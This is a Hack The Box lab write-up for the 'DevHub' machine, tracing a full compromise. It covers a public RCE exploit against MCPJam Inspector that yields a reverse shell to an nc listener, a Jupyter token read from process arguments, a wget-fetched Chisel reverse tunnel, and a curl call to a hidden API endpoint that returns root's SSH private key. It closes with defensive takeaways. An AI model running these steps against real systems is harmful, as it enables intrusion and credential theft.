# DevHub — Hack The Box Writeup

**Machine:** DevHub  
**OS:** Linux  
**Difficulty:** Medium  
**Status:** Retired  
**Date Completed:** June 2026  

---

## Summary

DevHub is a medium Linux machine built around an internal development platform hosting multiple services. Initial access is gained by exploiting CVE-2026-23744, a remote code execution vulnerability in MCPJam Inspector v1.4.2, obtaining a shell as `mcp-dev`. Post-exploitation enumeration reveals a locally running Jupyter Lab instance whose authentication token is exposed in plaintext process arguments. A Chisel reverse tunnel is used to forward the internal port to the attack machine, granting access to Jupyter as `analyst` and the user flag. Reading the `opsmcp` Flask API source code as `analyst` exposes both an API key and a hidden administrative endpoint. Calling that endpoint with the correct parameters causes the server — running as root — to read and return root's SSH private key, which is then used to authenticate directly as root.

**Key techniques:** CVE exploitation · Process argument enumeration · Port forwarding (Chisel) · Source code analysis · Hidden API endpoint abuse · SSH private key exfiltration

---

## 1. Reconnaissance

Full port scan:

```bash
sudo nmap -sV -sC -p- -T4 10.129.7.247
```

**Results:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp   open  http    nginx 1.18.0 — redirects to http://devhub.htb/
6274/tcp open  http    MCPJam Inspector (Node.js)
```

Three services. The HTTP service on port 80 redirects to `devhub.htb`:

```bash
sudo vi /etc/hosts
# Add: 10.129.7.247  devhub.htb
```

---

## 2. Enumeration

### Web Application — Port 80

The landing page at `http://devhub.htb` is an internal development platform index advertising three services: MCPJam Inspector (port 6274), a Jupyter analytics dashboard (localhost:8888, internal only), and a code repository in maintenance mode.

```bash
gobuster dir -u http://devhub.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Nothing beyond `index.html`. The interesting surface is port 6274.

### MCPJam Inspector — Port 6274

Navigating to `http://devhub.htb:6274` loads the MCPJam Inspector interface. The Settings panel reveals:

```
MCPJam Version: v1.4.2
```

Searching for public exploits against this version returns CVE-2026-23744, a remote code execution vulnerability in MCPJam Inspector v1.4.2.

---

## 3. Initial Access — CVE-2026-23744 (MCPJam Inspector RCE)

Clone and run the public PoC:

```bash
git clone https://github.com/SrGinebras/CVE-2026-23744-RCE-for-MCPjam-inspector-v1.4.2.git
cd CVE-2026-23744-RCE-for-MCPjam-inspector-v1.4.2
python3 -m venv venv && source venv/bin/activate
pip install requests
```

Set up a listener and run the exploit against port 6274:

```bash
# Terminal 1
nc -lvnp 4444

# Terminal 2
python3 CVE-2026-23744.py -u http://devhub.htb:6274 -i 10.10.15.54 -p 4444
```

```
connect to [10.10.15.54] from (UNKNOWN) [10.129.7.247] 34132
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

Shell obtained as `mcp-dev`. Upgrade to a full TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 4. Post-Exploitation Enumeration — mcp-dev

### LinPEAS

Upload and run LinPEAS. The scan flags a suspicious PATH but no directly writable directories or SUID binaries of interest. More productive findings come from manual enumeration.

### Writable Files

```bash
find / -writable -not -path '/proc/*' -not -path '/sys/*' -not -path '/dev/*' 2>/dev/null
```

Notable writable paths:

```
/opt/mcpjam
/opt/mcpjam/package.json
/usr/lib/systemd/system/...  (several system service files)
/etc/systemd/system/sudo.service
```

`/etc/systemd/system/sudo.service` turns out to be a symlink to `/dev/null` — a masking entry, not exploitable. `/opt/mcpjam/` is owned by `mcp-dev` but the service running it (`mcpjam.service`) runs as `mcp-dev`, so hijacking `package.json` would only give code execution as the current user.

### Process Enumeration — Jupyter Token Exposed

```bash
ps aux | grep jupyter
```

```
analyst  1036  ... /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab
         --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks
         --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
         --ServerApp.password=
```

The Jupyter Lab authentication token is exposed in full in the process argument list — a direct consequence of passing secrets as command-line arguments rather than environment variables or config files.

Two locally listening services are confirmed:

```bash
ss -tlnp | grep 127.0.0.1
```

```
LISTEN  127.0.0.1:8888   — JupyterLab (analyst)
LISTEN  127.0.0.1:5000   — opsmcp Flask API (root)
```

---

## 5. Lateral Movement — Chisel Tunnel to JupyterLab

Both ports are bound to localhost only, so direct access from the attack machine is blocked. A Chisel reverse tunnel is used to forward them.

**On attack machine:**

```bash
# Serve the binary
python3 -m http.server 8000

# Start Chisel server
./chisel server -p 1337 --reverse
```

**On target:**

```bash
cd /tmp
wget http://10.10.15.54:8000/chisel
chmod +x chisel
./chisel client 10.10.15.54:1337 R:8888:127.0.0.1:8888 R:5000:127.0.0.1:5000
```

```
client: Connected (Latency 164ms)
```

Ports 8888 and 5000 are now accessible on the attack machine's loopback. Navigate to:

```
http://127.0.0.1:8888/lab?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

JupyterLab opens as `analyst`. Open a terminal (File → New → Terminal).

```bash
cat ~/user.txt
# 5109f9b8682628ab99605434ff2ab6c3
```

---

## 6. Privilege Escalation — opsmcp API Credential Dump

### Reading server.py

As `analyst`, the `opsmcp` source is now readable:

```bash
cat /opt/opsmcp/server.py
```

Key findings in the source:

```python
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

The visible tool list exposed at `/tools/list` contains only four benign operations. However, the source also defines a `HIDDEN_TOOLS` dictionary not advertised by that endpoint:

```python
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    ...
}
```

The `ops._admin_dump` handler for `target=ssh_keys` reads `/root/.ssh/id_rsa` directly:

```python
elif tool_name == "ops._admin_dump":
    if target == "ssh_keys":
        with open('/root/.ssh/id_rsa', 'r') as f:
            key_data = f.read()
        return jsonify({"root_private_key": key_data, ...})
```

Since `opsmcp` runs as root (`ps aux` confirmed earlier), this call will succeed.

### Calling the Hidden Endpoint

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'
```

The response contains root's complete RSA private key.

### SSH as Root

Save the key on the attack machine (ensuring correct PEM formatting with real newlines), set permissions, and authenticate:

```bash
chmod 600 root_id_rsa
ssh -i root_id_rsa root@10.129.7.247
```

```
root@devhub:~# whoami
root
root@devhub:~# cat /root/root.txt
# 96b29bd11242733643ca83f5abc4765e
```

---

## Vulnerability Summary

| Vulnerability | Location | Impact |
|---------------|----------|--------|
| RCE (CVE-2026-23744) | MCPJam Inspector v1.4.2, port 6274 | Remote code execution as `mcp-dev` |
| Authentication token in process args | `jupyter-lab` command line | Token exposed to all local users via `ps aux` |
| Hidden unadvertised API endpoints | `opsmcp` Flask API, port 5000 | `ops._admin_dump` callable by any authenticated client |
| Hardcoded API key in source | `/opt/opsmcp/server.py` | Full API access without further authentication |
| Privileged file read via API | `ops._admin_dump` → `/root/.ssh/id_rsa` | Root SSH private key exfiltrated |
| Service running as root with user-readable code | `opsmcp.service` | Root-level operations exposed through analyst-readable source |

---

## Key Takeaways

- **Process arguments are public** — any local user can read the full command line of every running process via `ps aux`. Secrets passed as CLI arguments (tokens, passwords, API keys) are trivially exposed. Use environment variables or config files with restricted permissions instead
- **Hidden API endpoints are not security** — security through obscurity fails the moment source code becomes readable. The `ops._admin_dump` endpoint was not listed in `/tools/list` but was fully callable with the same credentials
- **Source code access is a privilege escalation primitive** — reading `server.py` as `analyst` was the critical step. Once you know the API key and the hidden endpoint logic, the path to root is trivial
- **Services running as root amplify every upstream weakness** — `opsmcp` ran as root purely by configuration. The same file read vulnerability in a non-privileged service would have had limited impact
- **Chisel is the reliable choice for localhost port forwarding** — ligolo-ng is better suited for subnet pivoting; for simple localhost tunnel scenarios, chisel is faster to set up and more predictable

---

*Part of my HTB writeup series — [back to portfolio](https://github.com/Egio7)*

---
<img width="1195" height="680" alt="Screenshot 2026-06-03 143707" src="https://github.com/user-attachments/assets/6ccdf777-f63d-412e-8769-36067c46c54a" />
